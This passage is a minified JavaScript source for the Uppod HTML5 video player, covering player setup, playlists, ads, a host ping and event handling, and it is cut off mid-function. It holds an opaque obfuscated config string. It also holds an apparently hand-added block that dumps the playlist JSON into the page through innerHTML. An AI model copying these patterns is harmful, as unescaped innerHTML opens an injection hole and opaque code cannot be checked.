var uppod_players, uppod_active_player_uid, uppodstyle = "", uppodvideo = "#07b02207406907002203a03102c02206107507406f02203a02206e06f06e06502202c02206806f07406b06507905f06107207206f07707305f07606f06c07506d06502203a03102c02207006c06306f06d06d06506e07406606f06e07407306907a06502203a03103302c02206f07306d06605f06806402203a02203002202c02206306e07407206c05f07606f06c07506d06502203a07b02206906306f06e02203a02203102207d02c02207006c07407506d06207303006206706306f06c06f07202203a02203303303303303303302202c02207006c06107207206f07707302203a02203102202c02206306f06e07407206f06c07302203a02207006c06107902c07406906d06505f07006c06107902c06c06906e06502c07406906d06505f06106c06c02c07606f06c07506d06502c07606f06c06206107206c06906e06502c06806402c06607506c06c02202c02207006c07006c06107902203a03102c02206306e07407206c06806906406502203a03102c02206206706306f06c06f07202203a02203003003003003003002202c02206306e07407206c05f06607506c06c02203a07b02206906306f06e02203a02203202207d02c02206306e07407206c05f06c06906e06502203a07b02206802203a03507d02c02206802203a03403003002c02206e06106d06507406106707303202203a02203c02f06606f06e07403e02202c02206306e07407206c05f07606f06c06206107206c06906e06502203a07b02207702203a03503002c02206802203a03507d02c02207306806f07706e06106d06502203a03102c02207006c06c06906d06907402203a03602c02206e06106d06507406106707303102203a02203c06606f06e07402002007306907a06503d02f03103302f03e02202c02207306d06f06f07406806906e06706d06506e07502203a03102c02207006c07407506d06207303006106c07006806102203a03102c02207006c07306307206f06c06c02203a03102c02207702203a03603403002c02207307407206506106d02203a03102c02206206f06407906306f06c06f07202203a02203002202c02207006c07407702203a03103103502c02206c06106e06702203a02207207502202c02207006c06d06107206706906e02203a03402c02207006c06306506e07406507202203a03102c02206306e07407206c06d06107206706906e02203a03402c02206306e07407206c06f07507406806506906706807402203a03303602c02207306906402203a02203503102d03203203803502202c02207007206f02203a03102c02206306e07407206c06206706306f06c06f07202203a02203007c03002202c02206306e07407206c05f07006c06107902203a07b02206d06107206706906e07206906706807402203a03102c02207306306106c06502203a03102e03502c02206d06107206706906e06c06506607402203a03107d02c02206806c07305f06806402203a02203002202c02206806402203a02203303603007002c03703203007002202c02206d02203a02207606906406506f02202c02207006c07406802203a03503002c02206806c07305f07306d06f06f07406807107506106c06907407902203a02203002202c02207006c07006c06106306502203a02206206f07407406f06d02202c02206e06f07406507306206706306f06c06f07202203a02203002202c02206306e07407206c05f06806402203a07b02206d06107206706906e07206906706807402203a03202c02206d06107206706906e06c06506607402203a03207d02c02207606f06c07506d06502203a03102c02206306e07407206c06206706607506c06c02203a03107d";
function UppodStorageSupport() {
    try {
        var t = window.localStorage
          , e = "__storage_test__";
        return t.setItem(e, e),
        t.removeItem(e),
        !0
    } catch (t) {
        return !1
    }
}
var uppod_storage_support = ("function" == typeof StorageSupport ? StorageSupport : UppodStorageSupport)(), UppodControl;
function Uppod(loadvars) {
    var _this = this, canvasObjs = [], vars, brw, ierr = "", ipad = !1, iphone = !1, android = !1, opera = !1, mobile = !1, nativecontrols = !1, ihtml5 = !1, init = !1, initevent = !1, iplay = !1, istart = !1, ifull = !1, irealfull = !1, ihide = !1, lastXY = 0, lastdXY = 0, ibuff = !1, iover = !1, istartevnt = !1, iline = !1, iloaded = !1, igo = !1, iwebkit = !1, firefox = !1, safari = !1, chrome = !1, itouch = !1, nametip, name_txt, controls, youtubeElemId, youtubeIframe, mouseMoveCatcher, playlist, pl_mc, pl, plwidth, plheight, ipl, plbg, pltext, plplayed, plrandom, plpage = 0, v, vvv, muted, hideInterval, rmenu, timelength = 4, timeitems = 0, line_s, volbarline_s, lastTime = 0, ltc = 0, layer, player, uibg, uibg_gl, oo, play_b, pause_b, back_b, stop_b, start_b, time_play_b, time_back_b, time_all_b, volume_b, volume_mute_b, volbarline_b, volbarline_all_b, volbarline_play_b, volbar_b, volbars, sep_b, run_b, run_pos, runvolume_b, runvolume_pos, sep, download_b, next_b, prev_b, plnext_b, plprev_b, full_b, full_back_b, line_b, line_all_b, line_load_b, line_play_b, line_but_b, space_b, buffer_b, menu_b, playlist_b, hd_b, hdselect, hd1_b, sub_b, sub_text, sub_bg, sub, sub_lang = 0, sub_showed = !1, sub_menu, sub_menu2, sub_menu_bg, isub_menu_color, isub_menu_bgcolor, sub_last, sub_lang_all = !1, mybuts = [], cntrlength, cntrl, cntrls, cntrli, controls, browser = new Uppod.Browser, logo, xhr_timeout = 5, uppod_ping_status = 0, uppod_ping_host_checked = "", uppod_ping_hosts = [], uppod = {
        _controls: null,
        _mediaW: null,
        _parentDom: null,
        _ads: null,
        iframe: {},
        window: {},
        document: {},
        toolTipOn: function(t) {
            t.onmouseover = function() {
                ToolTip(t, t.title)
            }
            ,
            t.onmouseout = function() {
                ToolTipHide(t)
            }
        },
        createMediaW: function() {
            return this._mediaW = new Uppod.MediaW({
                mode: vars.m,
                vars: vars,
                mobile: mobile,
                ads: this.ads()
            }),
            this._mediaW.onError.bind(function() {
                onReady(),
                NotFound()
            }),
            1 == vars.hlsautoquality && this._mediaW.onQuality.bind(function() {
                onHlsQuality()
            }),
            this._mediaW
        },
        mediaW: function() {
            return this._mediaW
        },
        controls: function() {
            return this._controls || (this._controls = new Uppod.Controls),
            this._controls
        },
        playerBodyElement: function() {
            return body
        },
        parentDom: function() {
            return this._parentDom
        },
        ads: function() {
            return !this._ads && Uppod.Ads && (this._ads = new Uppod.Ads({
                containerDom: uppod.document,
                containerDiv: uppod.iframe,
                uid: vars.uid,
                playerDom: this.playerBodyElement().c,
                prerollVast: CreateLink(vars.vast_preroll),
                postrollVast: CreateLink(vars.vast_postroll),
                pauserollVast: CreateLink(vars.vast_pauseroll),
                midrollVast: CreateLink(vars.vast_midroll),
                midrollTimes: CreateLink(vars.midroll_times),
                adEachPlaylistItem: 1 === parseInt(vars.vast_pl),
                pauseOnClick: 1 === parseInt(vars.vast_pauseonclick),
                prerollPauseOnClick: 1 === parseInt(vars.vast_preroll_pauseonclick)
            })),
            this._ads
        },
        vars: function() {
            return vars
        },
        toogleFullscreen: function() {
            return Full.apply(this, arguments)
        },
        isFullscreen: function() {
            return ifull
        }
    };
    function FileTo(t) {
        var e, i = !1;
        1 < uppod_ping_hosts.length && (e = uppod_ping_hosts[0],
        uppod_ping_host_checked != e && (uppod_ping_host_checked = e,
        i = !0)),
        i && (i = (new Date).getTime(),
        e = location.protocol + "//" + e + "/ping/" + i,
        (i = new XMLHttpRequest).open("GET", e, !0),
        i.timeout = 1e3 * xhr_timeout,
        i.ontimeout = function(t) {
            vars.ori != uppod_ping_hosts.length - 1 && (vars.ori = 1,
            NotFound(),
            uppod_storage_support ? null == localStorage.getItem("pljcuidx") && localStorage.setItem("pljcuidx", 2) : setCookie("pljcuidx", 2, 365))
        }
        ,
        i.onload = function(t) {
            vars.ori == uppod_ping_hosts.length - 1 && 4 == t.target.readyState && 200 == t.target.status && (vars.ori = 0,
            uppod_storage_support ? null != localStorage.getItem("pljcuidx") && localStorage.removeItem("pljcuidx") : getCookie("pljcuidx") && deleteCookie("pljcuidx"))
        }
        ,
        i.send())
    }
    function createBody() {
        body = new Shaper2({
            w: vars.sw,
            h: vars.sh,
            bgc: vars.bodycolor,
            brd: vars.brd,
            brdc: vars.brdcolor,
            h0: (1 == vars.cntrlout ? vars.sh - vars.cntrloutheight : 0) - (vars.pl && "bottom" == vars.plplace ? vars.plth + 20 : 0),
            a: 1 == vars.transparent ? -1 : 1
        }),
        uppod.document.appendChild(body.c),
        CSS(uppod.iframe, {
            "-webkit-user-select": "none",
            "-khtml-user-select": "none",
            "-moz-user-select": "none",
            "-o-user-select": "none",
            "user-select": "none",
            overflow: "hidden",
            margin: "0px",
            padding: "0px",
            width: "100%",
            height: "100%"
        }),
        CSS(body.c, {
            position: "absolute",
            top: 0,
            left: 0
        })
    }
    function createScreen() {
        scrn = createElement("div"),
        body.c.appendChild(scrn),
        CSS(scrn, {
            position: "absolute",
            top: vars.padding,
            left: vars.padding,
            width: "100%",
            height: "100%",
            "background-color": "#" + vars.screencolor,
            zIndex: 1
        })
    }
    function createPlaylists() {
        var t, e, i = !1;
        if (vars.pl) {
            if ("object" == typeof vars.pl && CreatePl(),
            "string" == typeof vars.pl) {
                if (vars.pl_original = vars.pl,
                e = 0 == vars.pl.indexOf("{") ? (e = vars.pl).replace(/'/g, '"') : (0 == vars.pl.indexOf("youtube:") && (8 == vars.pl.indexOf("user_") && (vars.pl = "https://www.googleapis.com/youtube/v3/channels?part=contentDetails&forUsername=" + vars.pl.substr(13) + "&key=" + vars.ytapi),
                8 == vars.pl.indexOf("search_") && (vars.pl = "https://www.googleapis.com/youtube/v3/search?part=snippet&q=" + Ytpl(vars.pl.substr(15)) + "&maxResults=" + vars.ytpllimit + "&order=" + vars.ytplorder + "&relevanceLanguage=" + vars.lang + "&key=" + vars.ytapi),
                8 == vars.pl.indexOf("pl_") && (vars.pl = "https://www.googleapis.com/youtube/v3/playlistItems?part=snippet&playlistId=" + vars.pl.substr(11) + "&maxResults=" + vars.ytpllimit + "&key=" + vars.ytapi),
                t = !0),
                LoadFile(vars.pl))) {
                    0 == e.indexOf("#") && (e = un(e));
                    try {
                        if (-1 < e.indexOf("'") && (e = e.replace(/\\'/g, "'")),
                        vars.pl = JSON.parse(e),
                        t) {
                            var o, s = vars.pl, l = {
                                folder: []
                            };
                            if (s.error)
                                s.error.errors[0].reason;
                            else if (s.items[0].contentDetails)
                                vars.pl = "youtube:pl_" + s.items[0].contentDetails.relatedPlaylists.uploads,
                                createPlaylists(),
                                i = !0;
                            else if (0 < s.items.length) {
                                for (o = 0; o < s.items.length; o++)
                                    s.items[o].snippet && (l.folder[o] = new Object,
                                    0 < vars.pl_original.indexOf(":pl_") && (l.folder[o].file = "http" + (1 == vars.https ? "s" : "") + "://youtube.com/watch?v=" + s.items[o].snippet.resourceId.videoId),
                                    0 < vars.pl_original.indexOf(":search_") && (l.folder[o].file = "http" + (1 == vars.https ? "s" : "") + "://youtube.com/watch?v=" + s.items[o].id.videoId),
                                    l.folder[o].poster = s.items[o].snippet.thumbnails.default.url,
                                    1 == vars.ytposter && (l.folder[o].bigposter = s.items[o].snippet.thumbnails.high.url),
                                    l.folder[o].link = l.folder[o].file,
                                    l.folder[o].title = s.items[o].snippet.title);
                                vars.pl = l
                            }
                        }
                        vars.pl.folder && (vars.pl = vars.pl.folder)
                    } catch (t) {
                        console.log(t),
                        Alert(vars.lang2.errjson_decode + " " + Filename(vars.pl_original), !0)
                    }
                }
                i || CreatePl()
            }
            "" == vars.file && (ipl = 0,
            1 == vars.random && (ipl = getRandomInt(0, pl.length - 1),
            Opacity(plbg[0], vars.plalpha),
            Opacity(plbg[ipl], vars.plalpha_play)),
            vars.pl[ipl].folder ? vars.pl[ipl].folder[0].folder ? UpdatedVarsFromPlaylist(vars.pl[ipl].folder[0].folder[0]) : UpdatedVarsFromPlaylist(vars.pl[ipl].folder[0]) : UpdatedVarsFromPlaylist(vars.pl[ipl]))
			
			
			var playlistsDiv = document.createElement('div');
			playlistsDiv.id = 'playlists';
			playlistsDiv.innerHTML = JSON.stringify(vars.pl);
			document.body.appendChild(playlistsDiv);
        }
    }
    function Ytpl(t) {
        for (var e = / /g, i = t.split(" ").length, o = 0; o < i; o++)
            t = t.replace(e, "%20");
        return t
    }
    function createAlert() {
        (alrt = createElement("div")).className = "uppod-alert",
        CSS(alrt, {
            width: "100%",
            position: "absolute",
            top: vars.padding,
            left: vars.padding,
            color: "#" + ReColor(vars.commentcolor),
            zIndex: 3
        }),
        body.c.appendChild(alrt),
        -1 == vars.commentbgcolor.indexOf("|") && (vars.commentbgcolor = vars.commentbgcolor + "|" + vars.commentbgcolor),
        alrt_bg = new Shaper2({
            w: vars.sw - 2 * vars.padding,
            h: "20",
            o: 0,
            bgc: vars.commentbgcolor,
            bga1: vars.commentbgalpha1,
            bga2: vars.commentbgalpha2
        }),
        alrt.appendChild(alrt_bg.c),
        alrt_txt = createElement("div"),
        alrt.appendChild(alrt_txt),
        CSS(alrt_txt, {
            position: "absolute",
            top: 0,
            left: 0,
            paddingTop: vars.commentmargin + vars.commenttopmargin,
            paddingLeft: vars.commentmargin + 5,
            paddingBottom: 1.3 * vars.commentmargin,
            fontFamily: vars.namefont,
            fontSize: vars.namefontsize + "px",
            fontStyle: FontStyle(vars.namefontstyle),
            fontWeight: FontWeight(vars.namefontstyle)
        }),
        alrt_x = createElement("div"),
        alrt.appendChild(alrt_x),
        CSS(alrt_x, {
            position: "absolute",
            top: 0,
            right: 0,
            paddingTop: 5,
            paddingRight: 10,
            cursor: "pointer",
            color: "#" + vars.commentcolor
        }),
        alrt_x.innerHTML = "x",
        alrt_x.onclick = CloseAlrt,
        alrt.style.display = "none",
        disableSelection(alrt)
    }
    function createTip() {
        1 == vars.tip && ((tip = createElement("div")).className = "uppod-tip",
        uppod.iframe.appendChild(tip),
        CSS(tip, {
            position: "absolute",
            top: 0,
            left: 0,
            visibility: "hidden",
            color: "#" + ReColor(vars.tipfontcolor),
            borderRadius: vars.tipbgo / 2,
            fontFamily: vars.tipfont,
            fontSize: vars.tipfontsize,
            fontWeight: FontWeight(vars.namefontstyle),
            padding: "4px",
            lineHeight: "normal"
        }),
        tip.style.zIndex = 9,
        CheckGradiendDiv(tip, vars.tipbgcolor))
    }
    function CreateLink(t) {
        return t = t && (t = t.replace(/\(referer\)/g, encodeURIComponent(vars.referer))).replace(/\(random\)/g, Math.random())
    }
    function createComment() {
        null != vars.title && "" != vars.title && 1 == vars.showname && (1 == vars.shownameliketip ? (CreateNameTip(vars.title),
        1 == vars.shownameonover && 0 == vars.shownameonstop && Hide(nametip)) : Alert(vars.title, !1),
        Comment(vars.title))
    }
    function createIframe(t) {
        uppod.iframe = createElement("div"),
        CSS(uppod.iframe, {
            position: "relative",
            width: "100%",
            height: "100%",
            border: "none"
        }),
        0 == vars.transparent && CSS(uppod.iframe, {
            backgroundColor: "#" + ReColor(vars.bgcolor)
        }),
        uppod.window = window,
        uppod.document = uppod.iframe,
        vars.stg.appendChild(uppod.iframe)
    }
    function createMouseMoveCatcher() {
        (mouseMoveCatcher = createElement("div")).className = "uppod-mouse-move-catcher",
        CSS(mouseMoveCatcher, {
            display: "none",
            "z-index": "103",
            position: "absolute",
            top: "0px",
            left: "0px",
            width: "100%",
            height: "100%"
        }),
        body.c.appendChild(mouseMoveCatcher)
    }
    function createPlayer() {
        OwnVars(),
        createIframe(),
        createBody(),
        ScreenSize(),
        createScreen(),
        createPlaylists(),
        vars.file && vars.file && vars.hd && QualityLinks(),
        createAlert(),
        createComment(),
        createMouseMoveCatcher(),
        Logo(),
        Media(),
        Controls(),
        oRadius(),
        Events(),
        createTip(),
        "" != ierr && Alert(ierr, !0),
        sizeInterval = setInterval(Sizing, 300)
    }
    loadvars.uid && (uppod_players = uppod_players || [],
    this.uid = loadvars.id = loadvars.uid,
    uppod_players.push(this)),
    document.getElementById(loadvars.id) ? Init() : document.addEventListener("DOMContentLoaded", Init);
    var _onReadyOnce = !1, body, scrn, alrt, alrt_txt, alrt_bg, alrt_x, tip, o11, o12, o21, o22, media_mc, poster_mc, media, media_yt, playInterval, touchStartX, touchStartY, touchLastX, touchLastY, ipltouch, plInterval, plaim;
    function onReady() {
        !_onReadyOnce && loadvars.onReady && (_onReadyOnce = !0,
        setTimeout(function() {
            loadvars.onReady.call(_this, _this)
        }, 50))
    }
    function initHtml5() {
        vars.stg.innerHTML = "",
        CSS(vars.stg, {
            lineHeight: "1",
            textAlign: "left",
            "text-align": "left",
            "-moz-user-select": "-moz-none",
            "-o-user-select": "none",
            "-khtml-user-select": "none",
            "-webkit-user-select": "none",
            "user-select": "none",
            overflow: "hidden"
        }),
        0 == vars.transparent && CSS(vars.stg, {
            backgroundColor: "#" + ReColor(vars.bgcolor)
        }),
        createPlayer()
    }
    function initFlash() {
        loadvars.file.replace("|", "or"),
        delete loadvars.st,
        loadvars.stflash && (loadvars.st = loadvars.stflash),
        new swfobject.embedSWF(vars.swf,vars.id,vars.sw,vars.sh,"10.0.0",!1,loadvars,{
            allowFullScreen: "true",
            allowScriptAccess: "always"
        }),
        onReady()
    }
    function OwnVars() {
        vars.vast_preroll = vars.preroll,
        vars.vast_postroll = vars.postroll,
        vars.vast_pl = 1,
        vars.vast_pauseonclick = 1,
        vars.vast_preroll_pauseonclick = 1,
        vars.hd = "360p,720p,1080p",
        vars.pllimit = 8,
        vars.cntrlout = 1,
        vars.cntrloutheight = 40,
        vars.remquality = 1
    }
    function Init() {
        var t;
        loadvars.id && (Detect(),
        (vars = new Vars).uid = loadvars.uid,
        vars.config.loader("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"),
        OwnVars(),
        browser.forceNativePlayBtn && ((t = document.createElement("style")).type = "text/css",
        t.appendChild(document.createTextNode("*::--webkit-media-controls-play-button {display: none!important;-webkit-appearance: none;}*::-webkit-media-controls-start-playback-button {display: none!important;-webkit-appearance: none;}")),
        uppod.document.appendChild(t)))
    }
    function gaTracker(t) {
        var e;
        ga && !vars.gatracked[t] && (e = null != vars.galabel ? vars.galabel : "" == vars.title || null == vars.title ? null == vars.file ? "pl" : vars.file : vars.title,
        0 == vars.gatype && ga("send", "event", {
            eventCategory: vars.m + ".uppod",
            eventAction: e,
            eventLabel: t
        }),
        1 == vars.gatype && ga("send", "event", {
            eventCategory: vars.m + ".uppod",
            eventAction: t,
            eventLabel: e
        }),
        vars.gatracked[t] = !0)
    }
    function Comment() {
        null != vars.title && "" != vars.title && 1 == vars.showname ? 1 == vars.shownameliketip ? NameTip((1 == vars.marquee ? "<marquee>" : "") + vars.title + ("" != vars.commentplus ? " " + vars.commentplus : "") + (1 == vars.marquee ? "</marquee>" : "")) : Alert((1 == vars.marquee ? "<marquee>" : "") + vars.title + ("" != vars.commentplus ? " " + vars.commentplus : "") + (1 == vars.marquee ? "</marquee>" : ""), !1) : Hide(alrt)
    }
    function Detect() {
        var t;
        brw = navigator.userAgent.toLowerCase(),
        "ontouchstart"in document.documentElement && (itouch = !0),
        0 < brw.indexOf("ipad") || 0 < brw.indexOf("iphone") ? (0 < brw.indexOf("iphone") && (iphone = !0),
        mobile = ipad = !0) : (-1 < brw.indexOf("webkit") && (iwebkit = !0),
        -1 < brw.indexOf("firefox") && (firefox = !0),
        -1 < brw.indexOf("android") && (mobile = android = !0),
        -1 < brw.indexOf("chrome") && (chrome = !0),
        -1 < brw.indexOf("opera") && (opera = !0)),
        navigator.vendor && -1 < navigator.vendor.indexOf("Apple") && (safari = !0),
        (ihtml5 = !!document.createElement("canvas").getContext) && (ihtml5 = !!document.createElement("video").canPlayType),
        loadvars && loadvars.file && (0 == (t = loadvars.file).indexOf("#") && (t = un(t)),
        0 < t.indexOf(".flv") && (ihtml5 = !1))
    }
    function Alert(t, e) {
        alrt ? (Show(alrt),
        alrt_txt.innerHTML = t,
        CSS(alrt_bg.canvas, {
            height: alrt_txt.offsetHeight,
            width: vars.sw - 2 * vars.padding
        }),
        (e ? Show : Hide)(alrt_x)) : alert("Uppod HTML5: " + t)
    }
    function CloseAlrt() {
        Hide(alrt)
    }
    function CreateNameTip(t) {
        CSS(nametip = createElement("div"), {
            width: "100%",
            position: "absolute",
            top: 5 + vars.namemargin_v + vars.padding,
            left: 5 + vars.namemargin_h + vars.padding,
            color: "#" + ReColor(vars.namecolor)
        }),
        body.c.appendChild(nametip),
        name_txt = createElement("div"),
        nametip.appendChild(name_txt),
        CSS(name_txt, {
            position: "absolute",
            top: 0,
            left: 0,
            padding: vars.namepadding / 2 + "px " + vars.namepadding + "px",
            fontFamily: vars.namefont,
            fontSize: vars.namefontsize + "px",
            fontStyle: FontStyle(vars.namefontstyle),
            fontWeight: FontWeight(vars.namefontstyle),
            zIndex: 2
        }),
        name_txt.innerHTML = (1 == vars.marquee ? "<marquee>" : "") + t + (1 == vars.marquee ? "</marquee>" : "");
        t = new Shaper2({
            w: name_txt.offsetWidth,
            h: name_txt.offsetHeight,
            o: vars.namebgo / 2,
            bgc: vars.namebgcolor + "|" + vars.namebgcolor,
            bga1: vars.namebgalpha,
            bga2: vars.namebgalpha
        });
        nametip.appendChild(t.c),
        CSS(t.canvas, {
            zIndex: 1
        })
    }
    function NameTip(t) {
        name_txt.innerHTML = t
    }
    function Logo(t) {
        "" != vars.logo && ((logo = document.createElement("img")).src = vars.logo,
        logo.onload = PositionLogo,
        uppod.document.appendChild(logo),
        Opacity(logo, vars.logoalpha),
        0 != vars.logopause || iplay || Hide(logo),
        "" != vars.logolink && (logo.onmouseover = function(t) {
            Opacity(logo, 1)
        }
        ,
        logo.onmouseout = function(t) {
            Opacity(logo, vars.logoalpha)
        }
        ,
        logo.onclick = function(t) {
            window.open(vars.logolink, vars.logotarget)
        }
        ),
        PositionLogo(),
        vars.logohide && setTimeout(function() {
            CSS(logo, {
                visibility: "hidden"
            })
        }, 1e3 * vars.logohide))
    }
    function PositionLogo() {
        1 == vars.logoplace && CSS(logo, {
            cursor: "pointer",
            position: "absolute",
            top: vars.logomargin_v,
            left: vars.logomargin_h
        }),
        2 == vars.logoplace && CSS(logo, {
            cursor: "pointer",
            position: "absolute",
            top: vars.logomargin_v,
            right: vars.logomargin_h
        }),
        3 == vars.logoplace && CSS(logo, {
            cursor: "pointer",
            position: "absolute",
            bottom: vars.logomargin_v + (0 == vars.cntrlout ? vars.cntrloutheight : 0),
            left: vars.logomargin_h
        }),
        4 == vars.logoplace && CSS(logo, {
            cursor: "pointer",
            position: "absolute",
            bottom: vars.logomargin_v + (0 == vars.cntrlout ? vars.cntrloutheight : 0),
            right: vars.logomargin_h
        })
    }
    function Events() {
        mobile || 1 != vars.hotkey || "video" != vars.m || body.c.addEventListener("dblclick", function() {
            (ifull ? FullOff : Full)()
        }),
        body.c.onmousemove = MouseMove,
        body.c.onmouseup = function(t) {
            volbarline_b && (volbarline_s.active = !1),
            line_b && (line_s.active = !1)
        }
        ,
        body.c.onmouseover = function(t) {
            iover = !0,
            1 == vars.shownameonover && Show(nametip)
        }
        ,
        body.c.onmouseout = function(t) {
            iover = !1,
            (1 == vars.cntrlhide || ifull && 1 == vars.fullcntrlhide) && (clearInterval(hideInterval),
            hideInterval = setInterval(CntrlHide, 3e3)),
            1 == vars.shownameonover && (1 == vars.shownameonstop && iplay || 0 == vars.shownameonstop) && Hide(nametip)
        }
        ;
        var o = "Uppod HTML5<br>0.13.05 v";
        body.c.oncontextmenu = function(t) {
            (t = t || window.event).cancelBubble = !0,
            t.stopPropagation && t.stopPropagation();
            var e = t.pageX - findLeft(vars.stg)
              , i = t.pageY - findTop(vars.stg);
            return rmenu ? CSS(rmenu, {
                display: "block",
                position: "absolute",
                top: i,
                left: e
            }) : ((rmenu = createElement("div")).id = "rmenu",
            uppod.document.appendChild(rmenu),
            t = createElement("div"),
            rmenu.appendChild(t),
            t.innerHTML = o,
            CSS(rmenu, {
                borderRadius: "0px",
                cursor: "pointer",
                position: "absolute",
                top: i,
                left: e,
                backgroundColor: "#000",
                color: "#fff",
                borderStyle: "solid",
                borderColor: "#000000",
                borderWidth: "1px",
                padding: "2px 5px 3px 5px",
                font: "9px Tahoma",
                opacity: "1"
            }),
            rmenu.style.zIndex = 999),
            setTimeout(function() {
                document.getElementById("rmenu").style.display = "none"
            }, 1e3),
            !1
        }
        ,
        1 == vars.postmessage && window.addEventListener("message", function(t) {
            var e = void 0;
            t.data.time && (e = t.data.time),
            t.data.volume && (e = t.data.volume),
            t.data.method && (console.log("postMessage", t.data.method, e),
            "play" == t.data.method && (iplay || Toggle()),
            "pause" == t.data.method && iplay && Toggle(),
            "mute" == t.data.method && (isYoutube() ? media_yt.isMuted() || Mute() : media.muted || Mute()),
            "unmute" == t.data.method && (isYoutube() ? media_yt.isMuted() && Mute() : media.muted && Mute()),
            "seek" != t.data.method && "seekTo" != t.data.method || !e || init && SeekTime(e),
            "setVolume" == t.data.method && e && Volume(e))
        }),
        document.addEventListener("click", DocClick)
    }
    function MouseMove(t) {
        ihide && 0 != (lastdXY = lastXY - (t.clientX + t.clientY)) && (CntrlShow(),
        (1 == vars.cntrlhide || ifull && 1 == vars.fullcntrlhide) && (clearInterval(hideInterval),
        hideInterval = setInterval(CntrlHide, 3e3))),
        lastXY = t.clientX + t.clientY
    }
    function DocClick(t) {
        rmenu && Hide(rmenu)
    }
    function KeyHandler(t) {
        var e, i;
        uppod_active_player_uid == vars.uid && "input" != t.target.tagName.toLowerCase() && "textarea" != t.target.tagName.toLowerCase() && (null == (e = t.which) && (e = t.keyCode),
        1 == vars.hotkey && ifull && 27 == e && FullOff(),
        1 == vars.hotkey && 38 == e && media && (t.preventDefault(),
